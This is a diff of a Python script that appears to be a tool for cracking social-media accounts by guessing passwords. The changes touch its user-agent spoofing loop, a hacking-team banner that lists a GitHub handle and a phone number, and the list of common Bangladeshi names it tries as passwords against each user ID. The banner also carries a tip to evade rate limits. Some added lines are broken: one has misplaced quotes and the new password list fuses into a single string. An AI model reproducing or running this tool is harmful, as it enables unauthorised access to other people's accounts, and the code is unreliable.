@@ -108,13 +108,13 @@ def follow(self, session, coki):
            
 #-----[UserAgent]-----#
 for xd in range(10000):
-    aa='Mozilla/5.0 (Linux; U; Android'
+    aa='Mozilla/5.0 (Linux; Android 12; 2201116SG)'
     b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
     c=' en-us; GT-'
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     e=random.randrange(1, 999)
     f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    g='AppleWebKit/537.36 ('KHTML, like Gecko') 'Chrome/112.0.0.0'
     h=random.randrange(73,100)
     i='0'
     j=random.randrange(4200,4900)
@@ -147,7 +147,7 @@ logo = (f"""
 ╠══[Github                   • \33[1;38mBIPUL-HACKING-TIM ]  \33[1;34m   
 ╠══[Number                  • 01759689717 ]  \33[1;35m 
 ╠══[TOOLS                    • FREE ]          \33[1;32m   
-╠══[VERSION                  • 0.2 ]          \033[1;35m 
+╠══[VERSION                  • 0.3 ]          \033[1;35m 
 \033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
 try:
    print('\n\n\033[1;33mLOADING ASSET FILES ... \033[0;97m')
@@ -215,7 +215,7 @@ def BIPUL():
         print('\033[1;92m [❤️] Use Flight Mode For Speed Up')
         linex()
         for fuck in user:
-            pwx = [fuck,'bangladesh']
+            pwx = [fuck,'bangladesh' 'sabbir' 'jannat' 'saiful' 'shakil']
             uid = code+fuck
             ahare.submit(mumitx,uid,pwx,tl)
     print('CRACK PROCESS HAS BEEN COMPLETED ')
